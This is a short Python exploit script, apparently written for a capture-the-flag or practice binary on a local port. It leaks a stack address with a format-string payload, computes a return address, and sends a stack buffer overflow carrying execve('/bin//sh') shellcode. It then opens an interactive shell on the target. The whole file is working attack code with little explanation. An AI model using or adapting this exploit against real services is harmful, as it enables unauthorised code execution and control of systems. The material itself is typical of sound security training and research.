import struct
import socket

s = socket.socket()
s.connect(('127.0.0.1', 1337))
r = s.recv(1024)
# python2 
# raw_input("EXPLOIT")
# python3
s.send(b"%p,%p,%p\n")
while b',' not in r:
  r = s.recv(1024)
print(r.split(b','))
start_buf = int(r.split(b',')[1], 16)-9
print("leaked start buffer: 0x{:08x})".format(start_buf))

input("EXPLOIT")
padding = b"dlsajhfoehsffoihrqew;ofihjireqo;hgfvior;ehqfgvohrefvoireqwuhvlujhewaqgfvhfjjertkmfghlvbjiortlwlghyv7l8954iuyghjnjjjik457lrwtgttyghgvlcnf,kyw4ar5yhlfnci878g,84uw5rygthrfi8lw4tygyfrilwtylgfllluritqw4tttyyfglqwyytgf4lq2tgflq2fglgtqru8w8e8fcbhqrewysadsaftrhgbbytjnetb"
print("padding")
print(padding)

RIP = (start_buf + len(padding) + 8 + 1 )
print(hex(RIP))
RIP = struct.pack("Q",RIP)
print("RIP")
print(RIP)

# "\xcc" for break points
# shellcode = b"\xcc"*64
# https://shell-storm.org/shellcode/files/shellcode-905.html
# Not shell code works on my sandbox.
shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
print("shellcode")
print(shellcode)

payload = padding + RIP + shellcode
s.send(payload)

#for byte_value in payload:
#  print(f'{byte_value:02x}')

from telnetlib import Telnet
t = Telnet()
t.sock = s
t.interact()
s.close()
